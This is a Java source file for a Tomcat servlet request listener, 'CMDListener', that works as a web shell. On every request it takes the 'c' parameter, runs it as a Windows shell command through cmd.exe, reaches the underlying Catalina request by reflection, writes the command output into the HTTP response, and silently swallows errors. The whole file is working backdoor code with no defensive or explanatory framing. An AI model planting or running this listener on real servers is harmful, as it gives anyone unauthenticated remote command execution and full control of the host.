package com.listener;

import org.apache.catalina.connector.Request;

import javax.servlet.ServletRequestEvent;
import javax.servlet.ServletRequestListener;
import javax.servlet.http.HttpServletRequest;
import java.io.InputStream;
import java.lang.reflect.Field;
import java.util.Scanner;

public class CMDListener implements ServletRequestListener {
    @Override
    public void requestDestroyed(ServletRequestEvent servletRequestEvent) {

    }

    @Override
    public void requestInitialized(ServletRequestEvent servletRequestEvent) {
        HttpServletRequest httpServletRequest = (HttpServletRequest) servletRequestEvent.getServletRequest();
        try {
            if (httpServletRequest.getParameter("c") != null) {
                String cmd = httpServletRequest.getParameter("c");
                InputStream inputStream = Runtime.getRuntime().exec(new String[]{"cmd.exe", "/c", cmd}).getInputStream();
                Scanner scanner = new Scanner(inputStream).useDelimiter("\\A");
                String output = scanner.hasNext()?scanner.next():"";
                Field requestField = httpServletRequest.getClass().getDeclaredField("request");
                requestField.setAccessible(true);
                Request request = (Request) requestField.get(httpServletRequest);
                request.getResponse().getWriter().write(output);
                request.getResponse().getWriter().write("\n");
                request.getResponse().getWriter().write("done\n");
                request.getResponse().getWriter().flush();
            }

        } catch (Exception e) {

        }
    }
}
